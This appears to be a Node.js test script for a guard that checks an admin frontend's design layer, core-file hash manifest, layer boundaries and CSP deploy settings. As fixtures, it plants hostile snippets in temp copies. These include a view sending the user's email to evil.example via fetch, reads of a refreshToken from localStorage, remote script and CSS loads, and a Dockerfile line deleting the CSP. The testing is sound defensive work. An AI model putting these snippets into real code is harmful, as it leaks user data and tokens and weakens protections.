#!/usr/bin/env node
// Tests for the design-layer guard (no dependencies, offline, no browser). Run: node scripts/test-guard.mjs
// Proves: every hostile fixture is caught, valid ones pass, the scope check works against a real git history of a
// monorepo-shaped temp repo (admin/ subfolder), the core hash manifest catches tampering, the layers and deploy
// checks catch what they must, and the CLI exit codes (0 ok / 1 violations / 2 usage).
// All tampering happens in TEMP COPIES of admin/; the real tree is only read.
import { readFileSync, writeFileSync, mkdirSync, mkdtempSync, cpSync, rmSync, existsSync } from "node:fs";
import { spawnSync, execFileSync } from "node:child_process";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import path from "node:path";
import { scanCode, scanDataJs, scanCss, scanAsset, scopeViolations } from "./lib/design-scan.mjs";
import { validateCopy, validateRoutes, defaultsProblems, LIMITS } from "../lib/design-schema.js";
import { deployChecks, ctxChecks, lockedList } from "./check-design.mjs";
import { layerChecks } from "./check-layers.mjs";
import { realSurface } from "./lib/ctx-surface.mjs";
import { CASES } from "./__fixtures__/cases.mjs";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const api = Object.fromEntries(Object.entries(JSON.parse(readFileSync(path.join(ROOT, "lib/public-api.json"), "utf8"))).filter(([k]) => k !== "_comment"));
let pass = 0, fail = 0;
const ok = (name, cond, extra = "") => { if (cond) pass++; else { fail++; console.error(`  FAIL ${name} ${extra}`); } };

// ── 1. rule fixtures ──
for (const c of CASES) {
  let found;
  if (c.kind === "code") found = scanCode(c.src, "design/views/fixture.js", { api, designRelPath: "design/views/fixture.js" });
  else if (c.kind === "data") found = scanDataJs(c.src, "design/copy.js");
  else found = scanCss(c.src, "design/theme.css", "design/theme.css");
  const rules = found.map((x) => x.rule);
  if (c.expect === null) ok(`valid: ${c.name}`, found.length === 0, JSON.stringify(found));
  else ok(`violation: ${c.name} -> ${c.expect}`, rules.includes(c.expect), `got ${JSON.stringify(rules)}`);
}

// ── 2. assets ──
const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(32)]);
ok("valid png asset", scanAsset(png, "design/assets/logo.png").length === 0);
ok("violation: .html asset", scanAsset(Buffer.from("<html>"), "design/assets/x.html").some((x) => x.rule === "asset/type"));
ok("violation: .js asset", scanAsset(Buffer.from("alert(1)"), "design/assets/x.js").some((x) => x.rule === "asset/type"));
ok("violation: oversize png", scanAsset(Buffer.concat([png, Buffer.alloc(LIMITS.assetMaxBytes)]), "design/assets/big.png").some((x) => x.rule === "asset/size"));
ok("violation: active svg (script)", scanAsset(Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'), "design/assets/bad.svg").some((x) => x.rule === "asset/svg-active"));

// ── 3. scope check (pure) ──
ok("scope: design files pass", scopeViolations(["design/copy.js", "design/views/orders.js", "design/theme.css"]).length === 0);
for (const p of ["lib/api.js", "core/context.js", "ui/kit.js", "app.js", "index.html", "styles.css", "nginx.conf", "design-defaults/copy.js", "scripts/check-design.mjs", "scripts/core.manifest.json", "../api/main.go", "../docs/x.md", "../.github/workflows/ci.yml", "../e2e/happy-path.mjs", "design/../lib/api.js", "designs/x.css"]) {
  ok(`scope: ${p} fails`, scopeViolations([p]).length === 1);
}

// ── 4. schema fallbacks / fixed warnings ──
{
  const defaults = { "a.b": "hello {name}", "c.d": "plain" };
  const r = validateCopy({ "a.b": "hi {name}!", "c.d": 5, "x.y": "unknown", "a b": "bad key" }, defaults);
  ok("copy: valid entry kept, bad ones dropped with warnings", r.copy["a.b"] === "hi {name}!" && Object.keys(r.copy).length === 1 && r.warnings.length === 3, JSON.stringify(r));
  ok("copy: invented placeholder dropped", !("a.b" in validateCopy({ "a.b": "hi {secret}" }, defaults).copy));
  const real = (await import("../design-defaults/copy.js")).default;
  const fw = validateCopy({ "confirm.deleteProduct.warn": "x", "confirm.deleteProduct.warning": "y", "confirm.newThing.warn": "z" }, real);
  ok("copy: a confirm.*warn* key is rejected (even for an unknown id)", Object.keys(fw.copy).length === 0 && fw.warnings.filter((w) => /FIXED/.test(w)).length === 3, JSON.stringify(fw.warnings));
  ok("defaults: define no warning keys", defaultsProblems(real).length === 0);
  ok("routes: only known ids with a views/ path are kept", Object.keys(validateRoutes({ login: "views/login.js", nope: "views/x.js", orders: "../lib/api.js", team: 5 }).routes).join() === "login");
}

// ── 5. surface: the whitelist equals the real ctx ──
{
  const real = await realSurface(ROOT);
  ok("surface: real ctx has the expected namespaces", ["ctx", "ctx.ui", "ctx.ui.schemaForm", "ctx.data", "ctx.actions", "ctx.logic", "ctx.enums", "ctx.format", "ctx.auth", "ctx.session", "ctx.nav", "ctx.route"].every((k) => real[k]), Object.keys(real).join());
  ok("surface: nested namespace is walked", real["ctx.ui.schemaForm"].includes("build") && real["ctx.ui"].includes("platformLinkOnce"));
  ok("surface: lib/public-api.json equals the real surface", (await ctxChecks(ROOT)).out.length === 0, JSON.stringify((await ctxChecks(ROOT)).out.slice(0, 3)));
}

// ── 6. temp checkouts ──
const CLI = (root, ...args) => spawnSync(process.execPath, [path.join(root, "scripts/check-design.mjs"), "--root", root, ...args], { encoding: "utf8" });
const write = (root, rel, text) => { mkdirSync(path.dirname(path.join(root, rel)), { recursive: true }); writeFileSync(path.join(root, rel), text); };
const rd = (root, rel) => readFileSync(path.join(root, rel), "utf8");
const git = (cwd, ...a) => execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", ...a], { cwd, stdio: "pipe", encoding: "utf8" });
const copyAdmin = (dest) => cpSync(ROOT, dest, { recursive: true, filter: (src) => !/[\\/](\.git|e2e|node_modules)([\\/]|$)/.test(src) });
const tmpRoots = [];
const mk = () => { const d = mkdtempSync(path.join(tmpdir(), "admin-guard-")); tmpRoots.push(d); return d; };

// A temp copy with the two known problems of the current tree patched, so that "fresh == exit 0" is testable
// regardless of what the leader has fixed yet. The shipped tree itself is judged separately (informational).
function patchedCheckout(dir) {
  copyAdmin(dir);
  let ng = rd(dir, "nginx.conf");
  if (!/object-src/.test(ng)) write(dir, "nginx.conf", ng.replace("frame-ancestors 'none'", "object-src 'none'; frame-ancestors 'none'"));
  const common = rd(dir, "design-defaults/copy/common.js");
  const copy = rd(dir, "design/copy.js");
  const needErr422 = !/"err\.422"/.test(common);
  if (needErr422) {
    write(dir, "design-defaults/copy/common.js", common.replace(/\n\};?\s*$|\n\}\s*;?\s*$/, '\n  "err.422": "資料不正確。",\n};\n'));
    if (!/"err\.422"/.test(rd(dir, "design-defaults/copy/common.js"))) throw new Error("test setup: could not patch err.422");
  }
  void copy;
  const r = CLI(dir, "--update");
  if (r.status !== 0) throw new Error("test setup: --update failed: " + r.stderr);
}

try {
  // shipped tree (informational: it may legitimately fail until the leader applies the reported fixes)
  const real = spawnSync(process.execPath, [path.join(ROOT, "scripts/check-design.mjs"), "--json"], { encoding: "utf8" });
  let rep = null; try { rep = JSON.parse(real.stdout); } catch { /* */ }
  ok("shipped tree: the guard runs to completion (exit 0 or 1, never 2)", real.status === 0 || real.status === 1, real.stderr);
  const shipped = rep ? rep.violations.filter((x) => !/^manifest\//.test(x.rule)) : [];
  console.log(`  info: shipped tree has ${rep ? rep.violations.length : "?"} violation(s) (${shipped.length} besides the manifest)${shipped.length ? ": " + shipped.map((x) => `[${x.rule}] ${x.file}`).join(", ") : ""}`);

  const dir = mk();
  patchedCheckout(dir);
  let r = CLI(dir);
  ok("fresh (patched) checkout: exit 0", r.status === 0, r.stdout + r.stderr);

  // scope via --files
  r = CLI(dir, "--files", "design/theme.css", "lib/api.js");
  ok("--files with a lib/ path: exit 1 + scope rule", r.status === 1 && /scope\/outside-design/.test(r.stderr), r.stderr);
  r = CLI(dir, "--files", "design/theme.css", "design/views/orders.js");
  ok("--files design-only: exit 0", r.status === 0, r.stderr);

  // hostile design files, each reverted afterwards
  const expectFail = (name, rule, mutate, revert, extra = []) => {
    mutate();
    const x = CLI(dir, ...extra);
    ok(`${name}: exit 1 + ${rule}`, x.status === 1 && new RegExp(rule.replace(/\//g, "\\/")).test(x.stderr), x.stderr.slice(0, 400));
    revert();
  };
  const routes0 = rd(dir, "design/routes.js");
  const evilRoute = () => write(dir, "design/routes.js", routes0.replace('"views/not-found.js"', '"views/evil.js"'));
  const hostile = [
    ["view calling fetch", "js/forbidden-identifier", `export default function view(root, ctx) { fetch("https://evil.example/?d=" + ctx.session.userEmail); }`],
    ["view using localStorage", "js/forbidden-identifier", `export default function view(root, ctx) { localStorage.getItem("refreshToken"); }`],
    ["view using eval", "js/forbidden-identifier", `export default function view(root, ctx) { eval("1"); }`],
    ["view using innerHTML", "js/forbidden-identifier", `export default function view(root, ctx) { root.innerHTML = "x"; }`],
    ["view touching document", "js/forbidden-identifier", `export default function view(root, ctx) { document.body.append(root); }`],
    ["view importing the core", "js/import", `import { api } from "../../lib/api.js";\nexport default function view(root, ctx) { api("GET", "/x"); }`],
    ["view with a string event handler", "js/event-handler-string", `export default function view(root, ctx) { root.append(ctx.ui.h("button", { onclick: "alert(1)" }, "x")); }`],
    ["view using an unknown ctx name", "js/ctx-unknown", `export default function view(root, ctx) { ctx.actions.wipeEverything(); }`],
  ];
  for (const [name, rule, src] of hostile) expectFail(`design/ ${name}`, rule, () => { write(dir, "design/views/evil.js", src); evilRoute(); }, () => { rmSync(path.join(dir, "design/views/evil.js")); write(dir, "design/routes.js", routes0); });
  // the same hostile code under design-defaults/ is also caught by the defaults scan
  expectFail("design-defaults/ view calling fetch", "defaults:js/forbidden-identifier", () => write(dir, "design-defaults/views/evil.js", `export default function view(root, ctx) { fetch("/x"); }`), () => rmSync(path.join(dir, "design-defaults/views/evil.js")), ["--no-layers"]);
  // positive: a harmless new design view and a design theme change add no violations
  write(dir, "design/views/extra.js", `export default function view(root, ctx) { root.append(ctx.ui.h("p", {}, ctx.t("common.empty"))); }`);
  write(dir, "design/theme.css", ".card { border-radius: 4px; }\n.dlg__warning { color: #b00020; }\n");
  r = CLI(dir);
  ok("positive: a new valid view + theme.css styling the fixed warning: exit 0", r.status === 0, r.stderr);
  rmSync(path.join(dir, "design/views/extra.js"));

  // routes
  const dr = rd(dir, "design/routes.js");
  write(dir, "design/routes.js", dr.replace('"views/not-found.js"', '"views/missing.js"'));
  r = CLI(dir); ok("routes.js pointing at a missing file: exit 1", r.status === 1 && /does not exist/.test(r.stderr), r.stderr);
  write(dir, "design/routes.js", dr.replace('"views/not-found.js"', '"../lib/api.js"'));
  r = CLI(dir); ok("routes.js pointing outside views/: exit 1", r.status === 1 && /schema\/routes/.test(r.stderr), r.stderr);
  write(dir, "design/routes.js", dr);

  // copy
  const copy = rd(dir, "design/copy.js");
  const firstKey = /^\s*"(common\.confirm)":/m.exec(copy) ? "common.confirm" : null;
  ok("test setup: design/copy.js has common.confirm", !!firstKey);
  write(dir, "design/copy.js", copy.replace(/export default \{/, 'export default {\n  "confirm.deleteProduct.warn": "放心，可以復原",'));
  r = CLI(dir); ok("copy.js defining confirm.deleteProduct.warn: exit 1 + warnings/copy-key", r.status === 1 && /warnings\/copy-key/.test(r.stderr) && /schema\/copy/.test(r.stderr), r.stderr);
  write(dir, "design/copy.js", copy.replace(/export default \{/, 'export default {\n  "confirm.cancelOrder.warning": "可以復原",'));
  r = CLI(dir); ok("copy.js defining a .warning key: exit 1", r.status === 1 && /warnings\/copy-key/.test(r.stderr), r.stderr);
  write(dir, "design/copy.js", copy.replace(/export default \{/, 'export default {\n  "nav.invented": "x",'));
  r = CLI(dir); ok("copy.js with an unknown key: exit 1", r.status === 1 && /nav\.invented/.test(r.stderr), r.stderr);
  write(dir, "design/copy.js", copy.replace(/export default \{/, 'export default {\n  "common.confirm": String(1),\n').replace(/\n  "common\.confirm": "[^"]*",/, ""));
  r = CLI(dir); ok("copy.js with a call: exit 1 (data file must be pure)", r.status === 1 && /js\/data-not-pure/.test(r.stderr), r.stderr);
  write(dir, "design/copy.js", copy.replace(/export default \{/, 'export default {\n  "common.confirm": "{token}",').replace(/\n  "common\.confirm": "確定",/, ""));
  r = CLI(dir); ok("copy.js inventing a placeholder: exit 1", r.status === 1 && /placeholder/.test(r.stderr), r.stderr);
  // a warned confirm loses a required key in design/copy.js
  const warnedKey = /"(confirm\.[A-Za-z0-9]+\.yes)":[^\n]*\n/.exec(copy);
  if (warnedKey) {
    write(dir, "design/copy.js", copy.replace(warnedKey[0], ""));
    r = CLI(dir);
    const stillWarned = /warnings\/copy-missing/.test(r.stderr);
    // only a violation when that id has a fixed warning; the first .yes key may belong to a non-warned confirm
    ok("copy.js dropping a .yes key: either fine (not a warned id) or warnings/copy-missing", r.status === 0 || stillWarned, r.stderr);
  }
  write(dir, "design/copy.js", copy);
  const warnedIds = (await import("../lib/meta/index.js")).WARNED_IDS;
  const wid = warnedIds[0];
  const yesRe = new RegExp(`\\n\\s*"confirm\\.${wid}\\.yes":[^\\n]*`);
  if (yesRe.test(copy)) {
    write(dir, "design/copy.js", copy.replace(yesRe, ""));
    r = CLI(dir); ok(`copy.js without confirm.${wid}.yes (warned id): exit 1 + warnings/copy-missing`, r.status === 1 && /warnings\/copy-missing/.test(r.stderr), r.stderr);
    write(dir, "design/copy.js", copy);
  } else ok("test setup: design/copy.js has the .yes key of the first warned confirm", false, wid);

  // css / assets / files
  expectFail("theme.css with a remote url()", "css/url", () => write(dir, "design/theme.css", ".a { background: url(https://evil.example/x.png); }"), () => write(dir, "design/theme.css", ""));
  expectFail("theme.css hiding the confirm dialog", "css/hides-dialog", () => write(dir, "design/theme.css", 'dialog [data-testid="confirm-yes"] { display: none; }'), () => write(dir, "design/theme.css", ""));
  expectFail("tokens.css with a remote @import", "css/import", () => write(dir, "design/tokens.css", "@import url(https://evil.example/x.css);"), () => write(dir, "design/tokens.css", rd(ROOT, "design/tokens.css")));
  expectFail("an .html file in assets", "asset/type", () => write(dir, "design/assets/payload.html", "<script>alert(1)</script>"), () => rmSync(path.join(dir, "design/assets/payload.html")));
  expectFail("a stray .json under design/", "files/type", () => write(dir, "design/views/notes.json", "{}"), () => rmSync(path.join(dir, "design/views/notes.json")));
  expectFail("a stray .js directly in design/", "files/location", () => write(dir, "design/extra.js", "export default {};"), () => rmSync(path.join(dir, "design/extra.js")));
  ok("clean again: exit 0", CLI(dir).status === 0);

  // core manifest
  const api0 = rd(dir, "lib/api.js");
  write(dir, "lib/api.js", api0 + "\n// tampered\n");
  r = CLI(dir, "--no-layers"); ok("a locked core file changed: exit 1 + manifest/changed", r.status === 1 && /manifest\/changed/.test(r.stderr) && /lib\/api\.js/.test(r.stderr), r.stderr);
  write(dir, "lib/api.js", api0.replace(/\r\n/g, "\n").replace(/\n/g, "\r\n"));
  ok("CRLF line endings hash the same as LF", CLI(dir).status === 0);
  write(dir, "lib/api.js", api0);
  write(dir, "core/newfile.js", "export const x = 1;\n");
  r = CLI(dir, "--no-layers"); ok("a NEW file under core/: exit 1 (added)", r.status === 1 && /added: core\/newfile\.js/.test(r.stderr), r.stderr);
  rmSync(path.join(dir, "core/newfile.js"));
  write(dir, "scripts/new-tool.mjs", "export {};\n");
  r = CLI(dir, "--no-layers"); ok("a NEW file under scripts/: exit 1 (guard code is locked)", r.status === 1 && /added: scripts\/new-tool\.mjs/.test(r.stderr), r.stderr);
  rmSync(path.join(dir, "scripts/new-tool.mjs"));
  const gs = rd(dir, "scripts/check-design.mjs");
  write(dir, "scripts/check-design.mjs", gs + "\n// weakened\n");
  r = spawnSync(process.execPath, [path.join(ROOT, "scripts/check-design.mjs"), "--root", dir, "--no-layers"], { encoding: "utf8" });
  ok("tampering with the guard itself: exit 1 (manifest)", r.status === 1 && /scripts\/check-design\.mjs/.test(r.stderr), r.stderr);
  write(dir, "scripts/check-design.mjs", gs);
  const dv = rd(dir, "design-defaults/views/login.js");
  write(dir, "design-defaults/views/login.js", dv + "\n// tampered default view\n");
  r = CLI(dir, "--no-layers"); ok("the pristine default views are locked too", r.status === 1 && /design-defaults\/views\/login\.js/.test(r.stderr), r.stderr);
  write(dir, "design-defaults/views/login.js", dv);
  write(dir, "docs/note.md", "unlocked");
  write(dir, "e2e/x.mjs", "unlocked");
  ok("docs/ and e2e/ are not locked", CLI(dir).status === 0);
  ok("lockedList excludes design/, docs/ and the manifest, includes design-defaults/, vendor/, nginx.conf", (() => { const l = lockedList(dir); return !l.some((f) => /^(design|docs|e2e)\//.test(f)) && !l.includes("scripts/core.manifest.json") && l.includes("design-defaults/copy.js") && l.includes("vendor/heic2any.min.js") && l.includes("nginx.conf") && l.includes("Dockerfile") && l.includes("app.js"); })());
  write(dir, "lib/api.js", api0 + "\n// intentional\n");
  ok("--update blesses an intentional core change", CLI(dir, "--update").status === 0 && CLI(dir, "--no-layers").status === 0);
  write(dir, "lib/api.js", api0); CLI(dir, "--update");

  // surface
  const pa = JSON.parse(rd(dir, "lib/public-api.json"));
  pa["ctx.ui"].push("wipeEverything");
  write(dir, "lib/public-api.json", JSON.stringify(pa));
  r = CLI(dir, "--no-layers"); ok("public-api.json listing a name that does not exist: exit 1 + ctx/manifest", r.status === 1 && /ctx\/manifest/.test(r.stderr) && /wipeEverything/.test(r.stderr), r.stderr);
  const pa2 = JSON.parse(rd(ROOT, "lib/public-api.json")); pa2["ctx.actions"] = pa2["ctx.actions"].slice(1);
  write(dir, "lib/public-api.json", JSON.stringify(pa2));
  r = CLI(dir, "--no-layers"); ok("public-api.json missing a real name: exit 1 + ctx/manifest", r.status === 1 && /ctx\/manifest/.test(r.stderr), r.stderr);
  write(dir, "lib/public-api.json", rd(ROOT, "lib/public-api.json")); CLI(dir, "--update");
  ok("restored: exit 0", CLI(dir).status === 0);

  // layers (in-process on the temp tree)
  const layerCase = (name, rule, file, mutate) => {
    const before = rd(dir, file);
    write(dir, file, mutate(before));
    const v = layerChecks(dir);
    ok(`layers: ${name} -> ${rule}`, v.some((x) => x.rule === `layers/${rule}` && x.file === file), JSON.stringify(v));
    write(dir, file, before);
  };
  ok("layers: the current tree passes", layerChecks(dir).length === 0, JSON.stringify(layerChecks(dir)));
  layerCase("ui calls fetch", "net", "ui/kit.js", (s) => s + '\nfetch("/api/v1/admin/me");\n');
  layerCase("ui reads localStorage", "net", "ui/kit.js", (s) => s + '\nlocalStorage.getItem("refreshToken");\n');
  layerCase("core writes an /api/v1 path", "net", "core/groups/orders.js", (s) => s + '\nconst U = "/api/v1/admin/x";\n');
  layerCase("core group uses raw fetch", "net", "core/groups/orders.js", (s) => s + '\nfetch("/x");\n');
  layerCase("app.js uses sessionStorage", "net", "app.js", (s) => s + '\nsessionStorage.setItem("a","b");\n');
  layerCase("a second raw fetch in the allowlisted core/auth.js", "net", "core/auth.js", (s) => s + '\nfetch("https://evil.example/");\n');
  layerCase("core group reads tokens", "tokens", "core/groups/orders.js", (s) => s + "\nconst t = tokens.access;\n");
  layerCase("core group names API_BASE", "tokens", "core/groups/orders.js", (s) => s + "\nconst b = API_BASE;\n");
  layerCase("core imports design statically", "design-import", "core/context.js", (s) => 'import x from "../design/copy.js";\n' + s);
  layerCase("ui imports core", "ui-import", "ui/kit.js", (s) => 'import { groups } from "../core/groups/index.js";\n' + s);
  layerCase("ui imports lib/session.js", "ui-import", "ui/kit.js", (s) => 'import { session } from "../lib/session.js";\n' + s);
  layerCase("lib imports ui", "lib-import", "lib/format.js", (s) => 'import { h } from "../ui/kit.js";\n' + s);
  layerCase("lib imports core", "lib-import", "lib/money.js", (s) => 'import { x } from "../core/context.js";\n' + s);
  layerCase("lib builds DOM", "lib-dom", "lib/money.js", (s) => s + '\nexport const el = () => document.createElement("div");\n');
  layerCase("lib uses innerHTML", "lib-dom", "lib/format.js", (s) => s + '\nexport const f = (n) => { n.innerHTML = "x"; };\n');
  layerCase("branding.js touches more DOM than allowed", "lib-dom", "lib/branding.js", (s) => s + '\ndocument.body.append(1);\n');
  layerCase("upload.js creates a second script element", "lib-dom", "lib/upload.js", (s) => s + '\nconst z = document.createElement("iframe");\n');

  // deploy: nginx.conf + index.html + Dockerfile (in-process on the temp tree)
  const ng0 = rd(dir, "nginx.conf"), ix0 = rd(dir, "index.html"), dk0 = rd(dir, "Dockerfile");
  const dep = (nginx, index = ix0, docker = dk0) => { write(dir, "nginx.conf", nginx); write(dir, "index.html", index); write(dir, "Dockerfile", docker); return deployChecks(dir).map((x) => x.rule).join(); };
  const csp = (f) => ng0.replace(/add_header Content-Security-Policy "([^"]+)"/, (m, p) => `add_header Content-Security-Policy "${f(p)}"`);
  ok("deploy: the patched tree passes", deployChecks(dir).length === 0, JSON.stringify(deployChecks(dir)));
  ok("deploy: 'wasm-unsafe-eval' in script-src is allowed", dep(ng0) === "");
  ok("deploy: no CSP header at all -> csp-missing", /deploy\/csp-missing/.test(dep(ng0.replace(/^\s*add_header Content-Security-Policy.*$/m, ""))));
  ok("deploy: a commented-out CSP does not count", /deploy\/csp-missing/.test(dep(ng0.replace(/^(\s*)add_header Content-Security-Policy(.*)$/m, "$1# add_header Content-Security-Policy$2"))));
  ok("deploy: nginx.conf missing -> csp-missing", (rmSync(path.join(dir, "nginx.conf")), /deploy\/csp-missing/.test(deployChecks(dir).map((x) => x.rule).join())));
  ok("deploy: script-src 'unsafe-inline' -> csp-weak", /deploy\/csp-weak/.test(dep(csp((p) => p.replace("script-src 'self'", "script-src 'self' 'unsafe-inline'")))));
  ok("deploy: script-src 'unsafe-eval' -> csp-weak", /deploy\/csp-weak/.test(dep(csp((p) => p.replace("script-src 'self'", "script-src 'self' 'unsafe-eval'")))));
  ok("deploy: script-src with a remote host -> csp-weak", /deploy\/csp-weak/.test(dep(csp((p) => p.replace("script-src 'self'", "script-src 'self' https://cdn.example")))));
  ok("deploy: a wildcard source -> csp-weak", /deploy\/csp-weak/.test(dep(csp((p) => p.replace("default-src 'self'", "default-src *")))));
  ok("deploy: style-src 'unsafe-inline' -> csp-weak", /deploy\/csp-weak/.test(dep(csp((p) => p.replace("style-src 'self'", "style-src 'self' 'unsafe-inline'")))));
  ok("deploy: no frame-ancestors -> csp-weak", /deploy\/csp-weak/.test(dep(csp((p) => p.replace(/; frame-ancestors 'none'/, "")))));
  ok("deploy: base-uri not 'none' -> csp-weak", /deploy\/csp-weak/.test(dep(csp((p) => p.replace("base-uri 'none'", "base-uri 'self'")))));
  ok("deploy: no object-src -> csp-weak", /deploy\/csp-weak/.test(dep(csp((p) => p.replace(/; object-src 'none'/, "")))));
  ok("deploy: CSP without `always` -> csp-always", /deploy\/csp-always/.test(dep(ng0.replace(/" always;/, '";'))));
  ok("deploy: a Dockerfile that does not install nginx.conf -> csp-dockerfile", /deploy\/csp-dockerfile/.test(dep(ng0, ix0, dk0.replace(/^COPY nginx\.conf.*$/m, ""))));
  ok("deploy: a Dockerfile that strips the CSP -> csp-dockerfile", /deploy\/csp-dockerfile/.test(dep(ng0, ix0, dk0 + "RUN sed -i '/Content-Security-Policy/d' /etc/nginx/conf.d/default.conf\n")));
  ok("deploy: inline <script> in index.html -> index-html", /deploy\/index-html/.test(dep(ng0, ix0.replace("</body>", "<script>alert(1)</script></body>"))));
  ok("deploy: onclick= attribute in index.html -> index-html", /deploy\/index-html/.test(dep(ng0, ix0.replace('<div id="app">', '<div id="app" onclick="x()">'))));
  ok("deploy: style= attribute in index.html -> index-html", /deploy\/index-html/.test(dep(ng0, ix0.replace('<div id="app">', '<div id="app" style="color:red">'))));
  ok("deploy: external <script src> -> index-html", /deploy\/index-html/.test(dep(ng0, ix0.replace("</body>", '<script src="https://evil.example/x.js"></script></body>'))));
  ok("deploy: restored -> passes", dep(ng0, ix0, dk0) === "");

  // exit codes
  r = CLI(dir, "--base", "no-such-ref-xyz"); ok("unreadable --base: exit 2", r.status === 2, `${r.status} ${r.stderr}`);
  r = spawnSync(process.execPath, [path.join(ROOT, "scripts/check-design.mjs"), "--root", path.join(dir, "nowhere")], { encoding: "utf8" });
  ok("unreadable --root: exit 2", r.status === 2, `${r.status} ${r.stderr}`);
} finally { /* cleaned below */ }

// ── 7. scope against a real git history in a MONOREPO-shaped temp repo (admin/ subfolder) ──
try {
  git(tmpdir(), "--version");
  const top = mk();
  git(top, "init", "-q");
  const adminDir = path.join(top, "admin");
  copyAdmin(adminDir);
  write(top, "api/main.go", "package main\n");
  write(top, "docs/readme.md", "x\n");
  git(top, "add", "-A"); git(top, "commit", "-q", "-m", "base");
  const SC = (...args) => spawnSync(process.execPath, [path.join(adminDir, "scripts/check-scope.mjs"), "--root", adminDir, ...args], { encoding: "utf8" });
  const CD = (...args) => spawnSync(process.execPath, [path.join(adminDir, "scripts/check-design.mjs"), "--root", adminDir, "--no-layers", ...args], { encoding: "utf8" });
  let x = SC("--base", "HEAD");
  ok("scope git: no changes: exit 0", x.status === 0, x.stderr);
  write(top, "admin/design/theme.css", ".card { border-radius: 4px; }\n");
  write(top, "admin/design/assets/mark.svg", '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><path d="M0 0h8v8z"/></svg>');
  x = SC("--base", "HEAD");
  ok("scope git: design-only diff incl. an untracked file: exit 0", x.status === 0, x.stderr);
  write(top, "admin/lib/perm-new.js", "export {};\n");
  x = SC("--base", "HEAD");
  ok("scope git: a new untracked file under admin/lib: exit 1", x.status === 1 && /lib\/perm-new\.js/.test(x.stderr), x.stderr);
  rmSync(path.join(adminDir, "lib/perm-new.js"));
  write(top, "admin/core/context.js", rd(adminDir, "core/context.js") + "\n// let everyone in\n");
  x = SC("--base", "HEAD");
  ok("scope git: a tracked core change: exit 1", x.status === 1 && /core\/context\.js/.test(x.stderr), x.stderr);
  write(top, "admin/core/context.js", rd(adminDir, "core/context.js").replace("\n// let everyone in\n", ""));
  x = SC("--base", "HEAD");
  ok("scope git: reverted: exit 0", x.status === 0, x.stderr);
  write(top, "api/main.go", "package main\n// changed\n");
  x = SC("--base", "HEAD");
  ok("scope git: a change OUTSIDE admin/ (api/) is a violation", x.status === 1 && /api\/main\.go/.test(x.stderr), x.stderr);
  write(top, "api/main.go", "package main\n");
  write(top, "docs/new.md", "x\n");
  x = SC("--base", "HEAD");
  ok("scope git: a new untracked file at the repo root docs/: exit 1", x.status === 1 && /docs\/new\.md/.test(x.stderr), x.stderr);
  rmSync(path.join(top, "docs/new.md"));
  write(top, ".github/workflows/ci.yml", "x\n");
  x = SC("--base", "HEAD");
  ok("scope git: .github/ change: exit 1", x.status === 1 && /\.github/.test(x.stderr), x.stderr);
  rmSync(path.join(top, ".github"), { recursive: true });
  git(top, "mv", "admin/lib/money.js", "admin/lib/money2.js");
  x = SC("--base", "HEAD");
  ok("scope git: a renamed core file: exit 1 (both names seen)", x.status === 1 && /lib\/money\.js/.test(x.stderr), x.stderr);
  git(top, "mv", "admin/lib/money2.js", "admin/lib/money.js");
  x = CD("--base", "HEAD");
  ok("check-design --base HEAD wires the scope check (design-only diff: no scope violation)", !/scope\/outside-design/.test(x.stderr), x.stderr);
  write(top, "admin/ui/kit.js", rd(adminDir, "ui/kit.js") + "\n// x\n");
  x = CD("--base", "HEAD");
  ok("check-design --base HEAD: ui/ change reports scope/outside-design (exit 1)", x.status === 1 && /scope\/outside-design/.test(x.stderr) && /ui\/kit\.js/.test(x.stderr), x.stderr);
} catch (e) {
  if (e && e.code === "ENOENT") console.log("  skipped: git is not available");
  else { fail++; console.error("  FAIL git scope tests crashed:", e.message); }
}

for (const d of tmpRoots) rmSync(d, { recursive: true, force: true });
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
